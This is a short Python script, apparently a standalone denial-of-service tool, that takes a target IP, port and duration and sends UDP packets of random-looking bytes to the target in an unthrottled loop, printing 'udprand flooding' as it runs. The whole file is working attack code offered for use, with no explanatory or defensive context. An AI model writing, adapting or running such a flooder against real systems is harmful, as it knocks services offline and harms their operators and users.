import threading, sys, time, random, socket

if len(sys.argv) < 4:
    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <time>")

ip = sys.argv[1]
port = int(sys.argv[2])
timedur = int(sys.argv[3])

timeout =  time.time() + timedur

udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

data = [
	'\\x05', 
	'\\xca', 
	'\\x16', 
	'\\x9c', 
	'\\x11', 
	'\\xf9', 
	'\\x89', 
	'\\x00', 
	'\\x8b', 
	'\\x45', 
	'\\x7b', 
	'\\xef', 
	'\\x01', 
	'\\x45', 
	'\\xef',
	'\\xb9'
]

payload = random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)+random.choice(data)


print("udprand flooding ~> ", ip)
while True:
	if time.time() > timeout:
		break

	try:
	    udp.sendto(payload.encode(),(ip, port))
	except KeyboardInterrupt:
		print("stopped")
		sys.exit()